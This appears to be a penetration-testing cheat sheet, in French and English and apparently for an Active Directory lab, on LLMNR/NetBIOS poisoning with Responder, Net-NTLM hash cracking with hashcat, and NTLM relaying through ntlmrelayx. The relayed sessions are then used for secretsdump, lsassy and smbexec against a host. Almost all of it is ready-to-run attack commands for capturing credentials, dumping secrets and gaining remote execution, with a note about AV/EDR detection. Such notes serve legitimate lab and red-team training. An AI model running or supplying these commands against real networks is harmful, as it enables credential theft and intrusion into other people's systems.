# Poison and Relay

## Responder

Répondre aux requêtes LLMNR et NETBIOS pour récupérer les hash net-ntlm

```
responder -I eth1
```

Voir les logs de Responder

```bash
ls -l /usr/share/responder/logs/
```

If you want to delete the previous captured logs (message skipped previously captured hash) delete the file `/usr/share/responder/Responder.db`

create a file responder.hashes with the two hashes found, and crack them

```bash
hashcat -m5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt 
```

## NTLM Relay

Générer une liste de cibles avec SMB signing : false

```bash
nxc smb 192.168.56.10-23 --gen-relay-list relay.txt
```

Stop the responder smb and http server as we don’t want to get the hashes directly but we want to relay them to ntlmrelayx -> /usr/share/responder/Responder.conf

```bash
sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'HTTP ='
sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf && cat /usr/share/responder/Responder.conf | grep --color=never 'SMB ='
```

Démarrer Responder pour empoisonner les réponses aux requêtes et les rediriger vers NTLMrelayx qui va host un proxy socks que l'on utilisera par la suite pour réaliser des actions sur les devices sur lesquels une sessions est ouverte.

```bash
impacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks
sudo responder -I eth1
```

### Use a socks relay with an admin account

#### Dump secrets

```bash
# ! POSSIBLE DETECTION ET BLOCAGE AV/EDR !
proxychains impacket-secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
```

#### SMB

```
proxychains impacket-smbclient -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
proxychains impacket-smbexec -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug
```
